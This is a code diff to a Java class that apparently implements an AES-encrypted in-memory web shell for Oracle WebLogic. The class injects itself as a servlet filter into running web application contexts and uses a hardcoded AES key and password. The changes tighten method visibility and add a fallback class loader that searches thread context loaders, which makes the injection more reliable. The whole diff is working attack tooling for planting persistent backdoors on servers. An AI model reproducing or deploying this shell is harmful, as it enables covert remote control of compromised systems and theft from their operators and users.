@@ -9,8 +9,8 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private static Class payloadClass;
-    String key = "3c6e0b8a9c15224a";
-    String password = "pass";
+    private String key = "3c6e0b8a9c15224a";
+    private String password = "pass";
 
 
     static {
@@ -34,10 +34,10 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         }
     }
 
-    public static Object[] getContextsByMbean() throws Throwable {
+    private static Object[] getContextsByMbean() throws Throwable {
         HashSet webappContexts = new HashSet();
-        Class serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
-        Class webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
+        Class serverRuntimeClass = loadClassEx("weblogic.t3.srvr.ServerRuntime");
+        Class webAppServletContextClass = loadClassEx("weblogic.servlet.internal.WebAppServletContext");
         Method theOneMethod = serverRuntimeClass.getMethod("theOne");
         theOneMethod.setAccessible(true);
         Object serverRuntime = theOneMethod.invoke(null);
@@ -85,7 +85,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         }
         return webappContexts.toArray();
     }
-    public static Object[] getContextsByThreads()throws Throwable{
+    private static Object[] getContextsByThreads()throws Throwable{
         HashSet webappContexts = new HashSet();
         ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
         int threadCount = threadGroup.activeCount();
@@ -120,7 +120,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         }
         return webappContexts.toArray();
     }
-    public static Object[] getContexts() {
+    private static Object[] getContexts() {
         HashSet webappContexts = new HashSet();
         try {
             webappContexts.addAll(Arrays.asList(getContextsByMbean()));
@@ -135,7 +135,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         return webappContexts.toArray();
     }
 
-    public static boolean addFilter(Class filterClass){
+    private static boolean addFilter(Class filterClass){
         boolean isOK = false;
         Object[] contexts = getContexts();
         for (int i = 0; i < contexts.length; i++) {
@@ -174,7 +174,40 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         return isOK;
     }
 
-    public static Field getField(Object obj, String fieldName){
+    private static Class loadClassEx(String className) throws ClassNotFoundException{
+        try {
+            return Class.forName(className);
+        } catch (Throwable e) {
+            try {
+                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
+            } catch (Throwable ignored) {
+                try {
+                    Thread[] threads = new Thread[Thread.activeCount()];
+                    Thread.enumerate(threads);
+                    for (int i = 0; i < threads.length; i++) {
+                        Thread thread = threads[i];
+                        if (thread == null) {
+                            continue;
+                        }
+                        try {
+                            ClassLoader loader = thread.getContextClassLoader();
+                            return loader.loadClass(className);
+                        } catch (Throwable ignored2) {
+
+                        }
+
+                    }
+
+                } catch (Throwable ignored2) {
+
+                }
+            }
+
+        }
+        throw new ClassNotFoundException(className);
+    }
+
+    private static Field getField(Object obj, String fieldName){
         Class clazz = null;
 
         if(obj == null){
@@ -202,7 +235,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
 
         return field;
     }
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f=null;
         if (obj instanceof Field){
             f=(Field)obj;
@@ -216,7 +249,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
     }
 
 
-    public byte[] aes(byte[] s,boolean m){
+    private byte[] aes(byte[] s,boolean m){
         try{
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
             c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
@@ -226,9 +259,9 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         }
     }
 
-    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }
+    private static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }
 
-    public static String base64Encode(byte[] bs) throws Exception {
+    private static String base64Encode(byte[] bs) throws Exception {
         Class base64;
         String value = null;
         try {
@@ -252,7 +285,7 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
         }
         return value;
     }
-    public static byte[] base64Decode(String bs) throws Exception {
+    private static byte[] base64Decode(String bs) throws Exception {
         Class base64;
         byte[] value = null;
         try {
